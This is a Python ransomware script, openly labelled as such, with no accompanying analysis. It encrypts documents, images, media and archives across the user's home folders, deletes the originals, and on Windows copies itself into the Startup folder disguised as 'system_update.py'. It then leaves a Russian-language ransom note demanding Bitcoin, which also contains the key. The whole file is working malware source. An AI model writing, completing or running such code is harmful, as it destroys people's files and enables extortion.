import os
import sys
import threading
from cryptography.fernet import Fernet

class Ransomware:
    def __init__(self):
        self.key = Fernet.generate_key()
        self.cipher = Fernet(self.key)
        self.target_dirs = [
            os.path.expanduser('~/' + path) for path in [
                'Documents', 'Desktop', 'Pictures', 
                'Videos', 'Downloads', 'Music'
            ]
        ]
        self.extensions = [
            '.txt', '.doc', '.docx', '.xls', '.xlsx', '.pdf',
            '.jpg', '.jpeg', '.png', '.bmp', '.avi', '.mp4',
            '.mp3', '.wav', '.zip', '.rar', '.7z'
        ]
    
    def encrypt_file(self, file_path):
        try:
            with open(file_path, 'rb') as f:
                data = f.read()
            encrypted_data = self.cipher.encrypt(data)
            with open(file_path + '.ENCRYPTED', 'wb') as f:
                f.write(encrypted_data)
            os.remove(file_path)
        except:
            pass
    
    def spread(self):
        for directory in self.target_dirs:
            if os.path.exists(directory):
                for root, _, files in os.walk(directory):
                    for file in files:
                        if any(file.endswith(ext) for ext in self.extensions):
                            file_path = os.path.join(root, file)
                            threading.Thread(target=self.encrypt_file, args=(file_path,)).start()
    
    def persist(self):
        if sys.platform == 'win32':
            startup_dir = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
            with open(os.path.join(startup_dir, 'system_update.py'), 'w') as f:
                f.write(open(__file__).read())
    
    def execute(self):
        self.persist()
        self.spread()
        with open('README_RANSOM.txt', 'w') as f:
            f.write(f'Все ваши файлы зашифрованы. Для расшифровки отправьте 0.5 BTC на адрес: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa\\n\\nКлюч: {self.key.decode()}')

if __name__ == '__main__':
    malware = Ransomware()
    malware.execute()
